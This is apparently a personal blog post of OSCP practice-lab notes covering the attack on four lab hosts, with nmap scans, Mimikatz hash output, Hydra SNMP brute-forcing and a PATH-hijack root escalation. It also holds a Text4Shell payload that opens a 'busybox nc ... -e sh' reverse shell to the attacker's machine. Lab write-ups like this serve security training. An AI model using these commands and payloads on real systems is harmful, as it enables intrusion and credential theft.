---
title: OSCP B
date: 2025-12-17T13:51:41+08:00
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
lastmod: 2025-12-31T05:48:04.774Z
---
192.168.217.147\
192.168.217.149\
192.168.217.150\
192.168.217.151

# Box Info

### ALL \[\[NMAP]]

```shell
192.168.217.147
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5985/tcp  open  wsman
8000/tcp  open  http-alt
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap scan report for 192.168.217.149
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 192.168.217.150
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap scan report for 192.168.217.151
Host is up (0.043s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8021/tcp open  ftp-proxy

```

# Recon  192.168.217.147

###### nmap

```shell
parallels@ubuntu-linux-2404:~/Desktop$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.217.147 -oN serviceScan.txt
[sudo] password for parallels: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-18 00:09 HKT
Nmap scan report for 192.168.217.147
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-12-17T16:10:28+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-17T16:10:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.66 seconds

```

###### \[\[FTP 21]] -- Scans

* 匿名登入
* 爆破登入

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
parallels@ubuntu-linux-2404:~/Desktop$ ftp 192.168.217.147
Connected to 192.168.217.147.
220 Microsoft FTP Service
Name (192.168.217.147:parallels): Eric.Wallows
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 

```

###### \[\[SSH 22]] -- Scans

* 爆破登入

> 如果允許任何爆破登入，這可能是取得檔和其他資訊的最佳位置。

```shell
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

oscp\eric.wallows@MS01 C:\Users\eric.wallows>whoami 
oscp\eric.wallows

oscp\eric.wallows@MS01 C:\Users\eric.wallows>

```

###### we are the admin

```
C:\ProgramData>whoami 
whoami 
nt authority\system

C:\ProgramData>

```

we got the web\_svc and the hashes 53e938166782a44e241beaf02d081ff6

```
Authentication Id : 0 ; 573025 (00000000:0008be61)
Session           : Batch from 0
User Name         : Administrator
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 1:30:53 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : MS01
	 * NTLM     : 3c4495bbd678fac8c9d218be4f2bbc7b
	 * SHA1     : 90afa30798b082c0d0aae85435421502c254d459
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	
```

> 擁有了第一部機器的最高限權 ,然後需要考慮橫向移動,這裏是為了製造橫向移動的立足點

# AD橫向移動 192.168.217.147

#### 1.尋找立足點

[Window Credentials Leak 憑證洩漏](/Window%20Credentials%20Leak%20%E6%86%91%E8%AD%89%E6%B4%A9%E6%BC%8F)  (Fast WIn)

```
```

[Windows 自動化檢查](/Windows%20%E8%87%AA%E5%8B%95%E5%8C%96%E6%AA%A2%E6%9F%A5) -- - 看信息和提权 oscp windows单机提权还是喜欢考教材那几个 路径未引用 服务权限配置错误 文件夹权限错误 priv权限分配过大等 其他的信息在winpeas也能一次性看齐 powershell历史文件 凭据管理器 其他类型的连接凭据putty,rdp等 还有一些奇怪非标准的文件夹 总之winpeas差不多都有了

```
```

[LLMNR OR NBT-NS POISON or NTLM](/LLMNR%20OR%20NBT-NS%20POISON%20or%20NTLM) - linux

```
```

[LLMNR OR NBT-NS POISON or NTLM](/LLMNR%20OR%20NBT-NS%20POISON%20or%20NTLM) - windows

```
```

#### 2.瞄準，尋找使用者

> 找出「有可能可利用」的帳號類型,高權限但未強化保護的帳號,不需要 Pre‑Authentication 的帳號,,

[使用者 and 密碼原則 列舉](/%E4%BD%BF%E7%94%A8%E8%80%85%20and%20%E5%AF%86%E7%A2%BC%E5%8E%9F%E5%89%87%20%E5%88%97%E8%88%89)

```
```

[AD 有效的 DONT\_REQ\_PREAUTH 使用者 OR 列表](/AD%20%E6%9C%89%E6%95%88%E7%9A%84%20DONT_REQ_PREAUTH%20%E4%BD%BF%E7%94%A8%E8%80%85%20OR%20%E5%88%97%E8%A1%A8)

```
```

#### 3.噴灑

> 針對不需要 Pre‑Authentication 的帳號進行分析，查看是否能取得攻擊者可離線破解的 **AS‑REP** 回應。

[smb 密碼噴灑](/smb%20%E5%AF%86%E7%A2%BC%E5%99%B4%E7%81%91)

```
```

[ASREPRoasting](/ASREPRoasting)

```
```

#### 4.深入兔子洞

> 從系統中收集與使用者認證相關的資料，包括 Credential Manager、PowerShell 歷史紀錄等。

[AD Powerview載入](/AD%20Powerview%E8%BC%89%E5%85%A5) -> [AD Enumeration (內部)- Powerview](/AD%20Enumeration%20\(%E5%85%A7%E9%83%A8\)-%20Powerview)

```
```

#### 5.Kerberosing

> 掃描 SPN（Service Principal Name），識別與服務帳戶相關的弱密碼帳號。\
> **錯誤的委派配置**：檢查是否有不當的委派配置，可能會導致攻擊者冒用服務帳號。

[Kerberoasting](/Kerberoasting)

```
```

\--- end at the oscp

#### 6.ACL

> 確認是否有過度授權的權限配置。

[ACL & DACL濫用](/ACL%20&%20DACL%E6%BF%AB%E7%94%A8)

```
```

###### 7.高階攻擊面評估 (Advanced Attack Vectors)

> 檢查 Zerologon 漏洞、DCShadow 攻擊等高危漏洞。\
> 評估 Active Directory 的核心安全性，尋找可能的全網域攻擊通道。\
> https://academy.hackthebox.com/module/143/section/1275\
> [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/)\
> https://academy.hackthebox.com/module/143/section/1484

#### 8.為什麼這麼信任人？

[AD Recycle Bin AD 回收垃圾桶](/AD%20Recycle%20Bin%20AD%20%E5%9B%9E%E6%94%B6%E5%9E%83%E5%9C%BE%E6%A1%B6)

```
```

[利用 GPO](/%E5%88%A9%E7%94%A8%20GPO)

```
```

[Active Directory Trust 信任利用](/Active%20Directory%20Trust%20%E4%BF%A1%E4%BB%BB%E5%88%A9%E7%94%A8)

```
```

***

***

# Recon 192.168.217.149

```shell
└─# sudo nmap -sU 192.168.160.149 --top-port=20                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 23:21 HKT
Nmap scan report for 192.168.160.149
Host is up (0.19s latency).

PORT      STATE  SERVICE
53/udp    closed domain
67/udp    closed dhcps
68/udp    closed dhcpc
69/udp    closed tftp
123/udp   closed ntp
135/udp   closed msrpc
137/udp   closed netbios-ns
138/udp   closed netbios-dgm
139/udp   closed netbios-ssn
161/udp   open   snmp
162/udp   closed snmptrap
445/udp   closed microsoft-ds
500/udp   closed isakmp
514/udp   closed syslog
520/udp   closed route
631/udp   closed ipp
1434/udp  closed ms-sql-m
1900/udp  closed upnp
4500/udp  closed nat-t-ike
49152/udp closed unknown

```

###### \[\[FTP 21]] -- Scans

* 匿名登入
* 爆破登入

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
└─#  ftp 192.168.203.149
Connected to 192.168.203.149.
220 (vsFTPd 3.0.3)
Name (192.168.203.149:root): kiero
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 



```

[SNMP Recon 161,162,10161,10162](/SNMP%20Recon%20161,162,10161,10162) --scan

\`\`

```shell
┌──(root㉿kali)-[~]
└─#             hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.203.149 -I -V

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-20 11:34:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.203.149:161/
[ATTEMPT] target 192.168.203.149 - login "" - pass "public" - 1 of 118 [child 0] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "private" - 2 of 118 [child 1] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "0" - 3 of 118 [child 2] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "0392a0" - 4 of 118 [child 3] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "1234" - 5 of 118 [child 4] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "2read" - 6 of 118 [child 5] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "4changes" - 7 of 118 [child 6] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "ANYCOM" - 8 of 118 [child 7] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "Admin" - 9 of 118 [child 8] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "C0de" - 10 of 118 [child 9] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "CISCO" - 11 of 118 [child 10] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "CR52401" - 12 of 118 [child 11] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "IBM" - 13 of 118 [child 12] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "ILMI" - 14 of 118 [child 13] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "Intermec" - 15 of 118 [child 14] (0/0)
[ATTEMPT] target 192.168.203.149 - login "" - pass "NoGaH$@!" - 16 of 118 [child 15] (0/0)
[161][snmp] host: 192.168.203.149   password: public
[STATUS] attack finished for 192.168.203.149 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-20 11:34:29

```

```shell
]
└─# snmpbulkwalk -v2c -c public 192.168.203.149  -m all NET-SNMP-EXTEND-MIB::nsExtendOutputFull

MIB search path: /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
[]Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value

```

###### \[\[SSH 22]]

```
└─# ssh john@192.168.203.149 -i id_rsa 
The authenticity of host '192.168.203.149 (192.168.203.149)' can't be established.
ED25519 key fingerprint is SHA256:+JvlP/LRLQWmEwhQC82TMUUSG5DDU1rjdgracnb/Vrw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '192.168.203.149' (ED25519) to the list of known hosts.
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ 

```

###### exploit form john to root

![Pasted image 20251220124705.png](/ob/Pasted%20image%2020251220124705.png)

![Pasted image 20251220124754.png](/ob/Pasted%20image%2020251220124754.png)

![Pasted image 20251220135822.png](/ob/Pasted%20image%2020251220135822.png)

![Pasted image 20251220143256.png](/ob/Pasted%20image%2020251220143256.png)

```
john@oscp:~$ cd /tmp
john@oscp:/tmp$ echo "/bin/bash" > chpasswd
john@oscp:/tmp$ chmod +x chpasswd 
john@oscp:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
john@oscp:/tmp$ export PATH=/tmp:$PATH
john@oscp:/tmp$ ls
```

```
john@oscp:/tmp$ bash
bash-5.0$ cat chpasswd 
cp /bin/bash /tmp && chmod +s /tmp/bash
bash-5.0$ 
```

```
john@oscp:/tmp$ bash -p 
bash-5.0# whoami
root
bash-5.0# 
```

***

# Recon 192.168.109.150

###### \[\[NMAP]]

```shell
─# sudo nmap -sU --top-ports=20 192.168.109.150                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 00:38 HKT
Nmap scan report for 192.168.109.150
Host is up (0.041s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown



sudo nmap  192.168.109.150 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 00:39 HKT
Nmap scan report for 192.168.109.150
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds

```

###### \[\[Unkown Port]] -- Scans

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

# Web Recon 192.168.109.150:8080 🪲

![Pasted image 20251216134111.png](/ob/Pasted%20image%2020251216134111.png)

#### Step  1

![Pasted image 20251221004247.png](/ob/Pasted%20image%2020251221004247.png)

###### \[\[Default 404 Pages]]

the website is created by java  of SpringBoot

###### \[\[WebSite Directory BurteForce]]

![Pasted image 20251221011107.png](/ob/Pasted%20image%2020251221011107.png)

```
└─# feroxbuster -u http://192.168.109.150:8080
                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.109.150:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       19c http://192.168.109.150:8080/
200      GET        1l        1w       25c http://192.168.109.150:8080/search
500      GET        1l        3w      105c http://192.168.109.150:8080/error
200      GET        8l       30w      194c http://192.168.109.150:8080/CHANGELOG
400      GET        1l       31w      800c http://192.168.109.150:8080/[
400      GET        1l       31w      800c http://192.168.109.150:8080/plain]
400      GET        1l       31w      800c http://192.168.109.150:8080/]
400      GET        1l       31w      800c http://192.168.109.150:8080/quote]
400      GET        1l       31w      800c http://192.168.109.150:8080/extension]
400      GET        1l       31w      800c http://192.168.109.150:8080/[0-9]
[####################] - 26s    30002/30002   0s      found:10      errors:0      
[####################] - 25s    30000/30000   1203/s  http://192.168.109.150:8080/  
```

###### \[\[Exploit-CVE]]

![Pasted image 20251221011130.png](/ob/Pasted%20image%2020251221011130.png)

```
Apache Commons Text 1.10.0 - Remote Code Execution
```

google search

![Pasted image 20251221011229.png](/ob/Pasted%20image%2020251221011229.png)

CVE Link : https://github.com/808ale/CVE-2022-42889-Text4Shell-POC

![Pasted image 20251221013630.png](/ob/Pasted%20image%2020251221013630.png)

![Pasted image 20251221013932.png](/ob/Pasted%20image%2020251221013932.png)

```shell
uv run text4shell.py -u "http://192.168.109.150:8080/search?query=" -c 'busybox nc 192.168.45.190 500 -e sh' -m 'rce'
Response status code: 200
Response body: {"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.45.190 500 -e sh')}","result":""}
```

```shell
stty raw -echo;fg
[1]  + continued  rlwrap nc -nvlp 500
dev@oscp:/$ export TERM=xterm
export TERM=xterm
dev@oscp:/$ whoami 
whoami 
dev
dev@oscp:/$ 
```

```
ps auxwwwwwwww
```

![Pasted image 20251223170935.png](/ob/Pasted%20image%2020251223170935.png)

https://www.ioactive.com/hacking-java-debug-wire-protocol-or-how/
